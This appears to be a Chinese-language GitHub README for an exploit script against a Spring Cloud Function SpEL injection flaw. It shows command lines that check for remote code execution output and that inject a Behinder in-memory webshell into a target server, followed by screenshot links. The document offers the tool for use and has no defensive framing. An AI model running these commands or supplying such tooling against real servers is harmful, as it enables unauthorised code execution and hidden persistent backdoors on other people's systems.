# -Spring-cloud-function-SpEL-RCE
针对spel表达式注入进行回显和内存马注入的exp
# 使用
回显探测

python3 SpringCloudFunction_rce.py -url http://127.0.0.1:8088/

<img width="790" alt="image" src="https://user-images.githubusercontent.com/38367493/165485812-a5e12b13-ce52-4b1b-bd76-17d1910bb602.png">

注入冰蝎

python3 SpringCloudFunction_rce.py -url http://127.0.0.1:8088/ -inject

<img width="773" alt="image" src="https://user-images.githubusercontent.com/38367493/165486095-87938c34-b3b2-43f3-a341-17ef606bd448.png">

<img width="1000" alt="image" src="https://user-images.githubusercontent.com/38367493/165486771-01e3ea5b-dbd6-4e14-9559-fa24483faa59.png">

